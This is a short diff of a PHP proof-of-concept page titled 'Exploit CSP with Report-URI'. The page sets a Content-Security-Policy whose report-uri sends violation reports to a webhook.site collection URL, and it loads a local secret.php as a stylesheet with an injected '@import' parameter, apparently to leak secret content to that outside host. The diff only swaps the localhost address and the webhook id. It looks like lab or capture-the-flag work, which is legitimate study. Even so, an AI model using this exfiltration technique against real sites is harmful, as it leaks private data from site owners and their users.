@@ -1,6 +1,6 @@
 <?php
 
-header("Content-Security-Policy: style-src http://localhost:8889/secret.php; report-uri https://webhook.site/97b703dc-c969-485e-85f9-14fe8881d298;");
+header("Content-Security-Policy: style-src http://127.0.0.1/secret.php; report-uri https://webhook.site/04b72cbe-5308-4e5c-9930-11d0629c7ee9;");
 
 
 ?>
@@ -11,7 +11,7 @@ header("Content-Security-Policy: style-src http://localhost:8889/secret.php; rep
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Exploit CSP with Report-URI</title>
-    <link rel="stylesheet" href="http://localhost:8889/secret.php?whatUwant=@import '">
+    <link rel="stylesheet" href="http://127.0.0.1/secret.php?whatUwant=@import '">
 </head>
 <body>
     <h1>Exploitation in Progress...</h1>
